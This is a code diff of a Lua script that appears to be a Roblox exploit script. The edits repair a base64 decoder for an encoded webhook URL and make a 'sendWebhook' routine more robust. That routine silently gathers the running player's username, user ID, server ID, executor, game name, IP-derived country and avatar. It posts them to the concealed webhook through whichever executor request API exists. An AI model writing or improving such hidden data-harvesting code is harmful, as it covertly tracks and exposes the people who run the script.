@@ -30,9 +30,9 @@ local function base64Decode(data)
             if c == "=" then 
                 n = n * 64
             else
-                local pos = string.find(b64, c) - 1
+                local pos = string.find(b64, c, 1, true)
                 if pos then
-                    n = n * 64 + pos
+                    n = n * 64 + (pos - 1)
                 end
             end
         end
@@ -66,13 +66,16 @@ local webhookUrl = base64Decode(encryptedWebhook)
 local function getAvatarUrl(userId)
     local HttpService = game:GetService("HttpService")
     local avatarUrl = ""
-    pcall(function()
+    local success, result = pcall(function()
         local apiUrl = string.format(
             "https://thumbnails.roblox.com/v1/users/avatar-bust?userIds=%d&size=420x420&format=Png&isCircular=false",
             userId
         )
-        local res = HttpService:JSONDecode(game:HttpGet(apiUrl))
-        avatarUrl = res.data[1].imageUrl
+        local response = game:HttpGet(apiUrl)
+        local data = HttpService:JSONDecode(response)
+        if data and data.data and data.data[1] then
+            avatarUrl = data.data[1].imageUrl or ""
+        end
     end)
     return avatarUrl
 end
@@ -80,7 +83,6 @@ end
 local function sendWebhook()
     pcall(function()
         local HttpService = game:GetService("HttpService")
-        local Marketplace = game:GetService("MarketplaceService")
         local localPlayer = game:GetService("Players").LocalPlayer
 
         if not localPlayer then return end
@@ -88,17 +90,20 @@ local function sendWebhook()
         local username = localPlayer.Name
         local userId   = localPlayer.UserId
         local serverId = game.JobId
-        local executor = getexecutorname() or "Unknown"
+        local executor = getexecutorname and getexecutorname() or "Unknown"
 
         local mapName = "Unknown"
         pcall(function()
-            mapName = Marketplace:GetProductInfo(game.PlaceId).Name
+            local MarketplaceService = game:GetService("MarketplaceService")
+            local productInfo = MarketplaceService:GetProductInfo(game.PlaceId)
+            mapName = productInfo.Name or "Unknown"
         end)
 
         local country = "Unknown"
         pcall(function()
-            local res = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
-            country = res.country or "Unknown"
+            local response = game:HttpGet("http://ip-api.com/json")
+            local data = HttpService:JSONDecode(response)
+            country = data.country or "Unknown"
         end)
 
         local avatarUrl = getAvatarUrl(userId)
@@ -130,14 +135,22 @@ local function sendWebhook()
 
         local jsonPayload = HttpService:JSONEncode(payload)
         
-        request({
+        local requestOptions = {
             Url     = webhookUrl,
             Method  = "POST",
             Headers = { 
                 ["Content-Type"] = "application/json"
             },
             Body    = jsonPayload,
-        })
+        }
+        
+        if syn and syn.request then
+            syn.request(requestOptions)
+        elseif http and http.request then
+            http.request(requestOptions)
+        elseif request then
+            request(requestOptions)
+        end
     end)
 end
 
